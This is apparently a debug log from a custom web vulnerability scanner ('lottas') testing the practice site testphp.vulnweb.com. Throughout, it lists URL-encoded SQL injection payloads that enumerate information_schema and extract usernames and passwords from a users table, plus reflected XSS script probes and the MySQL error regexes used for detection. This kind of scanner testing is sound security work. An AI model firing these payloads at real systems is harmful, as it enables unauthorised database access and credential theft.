[2022-08-31][16:14:05][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=999999.9%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:05][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=999999.9%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:05][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-9999+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2Cpass%2C8%2C9%2C10%2C11+FROM+users%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:05][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-9999+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2Cpass%2C8%2C9%2C10%2C11+FROM+users%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:05][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+11+--%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:05][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+11+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:05][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-999999++UNION+SELECT+1%2Cuname%2C3%2C4%2C5%2C6%2Cversion%28%29%2C8%2Cpass%2C10%2C11+FROM+users%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:05][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-999999++UNION+SELECT+1%2Cuname%2C3%2C4%2C5%2C6%2Cversion%28%29%2C8%2Cpass%2C10%2C11+FROM+users%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:06][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=2%3E%3Cscript%3Ealert%28%22Anmol%22%29%3C%2Fscript%3E%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:06][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2%3E%3Cscript%3Ealert%28%22Anmol%22%29%3C%2Fscript%3E%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:06][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipT%3Econfirm%281%29%3C%2Fscript%3E%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:06][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipT%3Econfirm%281%29%3C%2Fscript%3E%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:06][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+12%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:06][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+12%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:06][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%60%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:06][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%60%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:06][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2CEVENT_CATALOG+from+information_schema.EVENTS%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:06][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2CEVENT_CATALOG+from+information_schema.EVENTS%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:06][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28table_name%29+from+information_schema.tables%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:06][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28table_name%29+from+information_schema.tables%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:06][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=123%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:06][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=123%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:06][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1%3D1+UNION+ALL+SELECT+1%2C2%2C3%2C4+from+information_schema.tables--+-%27123 | Warning.*?\Wmysqli?_
[2022-08-31][16:14:06][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1%3D1+UNION+ALL+SELECT+1%2C2%2C3%2C4+from+information_schema.tables--+-%27123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][16:14:06][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+2%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:06][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+2%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:06][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:06][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:06][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%27%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:06][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:06][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%E2%80%9D%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:06][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%E2%80%9D%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:06][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28table_name%29+from+information_schema.tables+where+table_schema%3D%27acuart%27+--%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:06][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28table_name%29+from+information_schema.tables+where+table_schema%3D%27acuart%27+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:07][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28uname%2C0x3a%2Cpass%29+from+acuart.users+--%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:07][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28uname%2C0x3a%2Cpass%29+from+acuart.users+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:07][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28column_name%29+from+information_schema.columns+where+table_name%3D%27users%27+--%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:07][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28column_name%29+from+information_schema.columns+where+table_name%3D%27users%27+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:07][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1*%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:07][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1*%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:29][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][16:14:36][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=4%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=4%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=3%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=3%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-999999++UNION+SELECT+1%2Cuname%2C3%2C4%2C5%2C6%2Cversion%28%29%2C8%2Cpass%2C10%2C11+FROM+users%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-999999++UNION+SELECT+1%2Cuname%2C3%2C4%2C5%2C6%2Cversion%28%29%2C8%2Cpass%2C10%2C11+FROM+users%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1%3D1+UNION+ALL+SELECT+1%2C2%2C3%2C4+from+information_schema.tables--+-%27123 | Warning.*?\Wmysqli?_
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1%3D1+UNION+ALL+SELECT+1%2C2%2C3%2C4+from+information_schema.tables--+-%27123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2C%40%40version%2C%27vuln3%27%2C%27vuln4%27%2C%27vuln5%27%2C%27vuln6%27%2C%27vuln7%27%2C%27vuln8%27%2C%27vuln9%27%2C%27vuln10%27%2C%27vuln11%27%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2C%40%40version%2C%27vuln3%27%2C%27vuln4%27%2C%27vuln5%27%2C%27vuln6%27%2C%27vuln7%27%2C%27vuln8%27%2C%27vuln9%27%2C%27vuln10%27%2C%27vuln11%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-9999+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2Cpass%2C8%2C9%2C10%2C11+FROM+users%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-9999+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2Cpass%2C8%2C9%2C10%2C11+FROM+users%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%60%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%60%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1--dbs%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1--dbs%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%5Edatabase%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%5Edatabase%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=2+order+by+12--+%27123 | Warning.*?\Wmysqli?_
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2+order+by+12--+%27123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=2%27%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+1%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+1%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=2%3E%3Cscript%3Ealert%28%22Anmol%22%29%3C%2Fscript%3E%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2%3E%3Cscript%3Ealert%28%22Anmol%22%29%3C%2Fscript%3E%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+12%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+12%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=123%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=123%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=999999.9%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=999999.9%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipT%3Econfirm%281%29%3C%2Fscript%3E%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipT%3Econfirm%281%29%3C%2Fscript%3E%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2Cdatabase%28%29%2C%27vul%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2Cdatabase%28%29%2C%27vul%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%27%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%E2%80%9D%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%E2%80%9D%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+11+--%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:37][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+11+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:37][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%27123 | SQL syntax.*?MySQL
[2022-08-31][16:59:29][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][16:59:29][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][16:59:30][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28uname%2C0x3a%2Cpass%29+from+acuart.users+--%27123 | SQL syntax.*?MySQL
[2022-08-31][16:59:30][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28uname%2C0x3a%2Cpass%29+from+acuart.users+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:59:58][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][16:59:58][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][17:00:59][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][17:00:59][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][17:01:48][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][17:01:48][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][17:02:14][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][17:02:14][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][17:22:06][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][17:22:06][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][17:22:22][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][17:22:22][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][17:22:35][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][17:22:35][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][17:27:11][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][17:27:11][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][17:27:20][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][17:27:20][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][18:06:36][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][18:06:36][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][18:28:44][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][18:28:44][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][18:28:45][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:57][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][18:28:57][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2C%40%40version%2C%27vuln3%27%2C%27vuln4%27%2C%27vuln5%27%2C%27vuln6%27%2C%27vuln7%27%2C%27vuln8%27%2C%27vuln9%27%2C%27vuln10%27%2C%27vuln11%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cdatabase%28%29--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1%3D1+UNION+ALL+SELECT+1%2C2%2C3%2C4+from+information_schema.tables--+-%27123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1*%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28table_name%29+from+information_schema.tables+where+table_schema%3D%27acuart%27+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=999999.9%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1--dbs%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Ctable_name+from+information_schema.tables%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+12%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+1%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=3%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%5Edatabase%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28column_name%29+from+information_schema%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2CEVENT_CATALOG+from+information_schema.EVENTS%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%E2%80%9D%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28uname%2C0x3a%2Cpass%29+from+acuart.users+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2Cgroup_concat%28colu%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:58][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2Cdatabase%28%29%2C%27vul%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=123%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipT%3Econfirm%281%29%3C%2Fscript%3E%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28column_name%29+from+information_schema.columns+where+table_name%3D%27users%27+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2%3E%3Cscript%3Ealert%28%22Anmol%22%29%3C%2Fscript%3E%27123", "SQL syntax.*?MySQL"))
